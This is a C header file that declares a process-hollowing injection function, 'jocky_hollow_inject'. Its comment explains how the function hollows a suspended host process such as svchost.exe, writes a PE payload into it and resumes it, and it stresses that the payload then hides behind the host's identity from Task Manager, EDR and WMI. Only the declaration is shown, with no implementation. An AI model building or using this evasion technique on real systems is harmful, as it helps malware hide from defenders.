#pragma once
#include <windows.h>

/*
 * jocky_hollow_inject
 * ====================
 * Spawns a suspended copy of `target_path`, unmaps its memory,
 * writes `payload` into the vacated address space, fixes the
 * entry-point in the thread context, and resumes execution.
 *
 * Parameters:
 *   target_path  — path to the host process to hollow
 *                  (e.g. L"C:\\Windows\\System32\\svchost.exe")
 *   payload      — raw PE image bytes to inject (must be a valid PE)
 *   payload_size — size of payload in bytes
 *
 * Returns:
 *   TRUE  — injection succeeded; hollowed process is running
 *   FALSE — a Windows API call failed; call GetLastError() for detail
 *
 * The injected process inherits the identity of target_path —
 * Task Manager, EDR process trees, and WMI all see target_path.
 */
BOOL jocky_hollow_inject(
    LPCWSTR target_path,
    LPVOID  payload,
    SIZE_T  payload_size
);